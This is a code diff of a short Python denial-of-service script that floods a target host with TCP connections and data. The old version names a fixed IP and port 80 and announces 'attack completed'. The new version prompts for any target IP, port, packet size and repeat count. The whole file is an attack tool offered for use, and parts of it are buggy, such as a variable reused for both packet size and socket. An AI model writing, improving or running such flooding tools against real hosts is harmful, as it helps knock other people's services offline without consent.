@@ -1,34 +1,40 @@
+import socket
 import sys
 
-sys.ps1 = '\033[01;32m '
 
+print(sys.ps1)
 print('''
 
-===================================================================
-_____   ________    ___________________  _____      _____  __________
-\   \ /   /_   |  /   _____/\______   \/  _  \    /     \ \____    /
- \   Y   / |   |  \_____  \  |     ___/  /_\  \  /  \ /  \  /     / 
-  \     /  |   |  /        \ |    |  /    |    \/    Y    \/     /_ 
-   \___/   |___| /_______  / |____|  \____|__  /\____|__  /_______ \
-                         \/                  \/         \/        \/
-===================================================================
+ ####### ######   #####   #####  
+    #    #     # #     # #     # 
+    #    #     #       #       # 
+    #    ######   #####   #####  
+    #    #   #         #       # 
+    #    #    #  #     # #     # 
+    #    #     #  #####   #####  
+                                 
 
 ''')
 
+IP1 = input("Enter IP: ")
+port1 = int(input("Enter the port: "))
+T1 = input("How many Threads ya wanna send?: ")
+
+s = int(input("Enter the packet size: "))
+
+TCP_IP = IP1
+TCP_PORT = port1
+BUFFER_SIZE = s
+MESSAGE = 1000
 
 print("connecting...")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+print("spamming "+TCP_IP)
 
-import socket
-
-TCP_IP = '192.0.78.13'
-TCP_PORT = 80
-BUFFER_SIZE = 650000
-MESSAGE = "good night!"
-print("spamming ", TCP_IP+":", TCP_PORT, " with Packet Size: ", BUFFER_SIZE)
-for i in range(6500000):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((TCP_IP, TCP_PORT))
-#    s.send(MESSAGE)
+for i in range(int(T1)):
+    s.send(bytes(MESSAGE))
     data = s.recv(BUFFER_SIZE)
+    print('spamming '+TCP_IP)
 s.close()
-print("attack completed now go to back to bed")
+print("spam completed now go to back to bed")
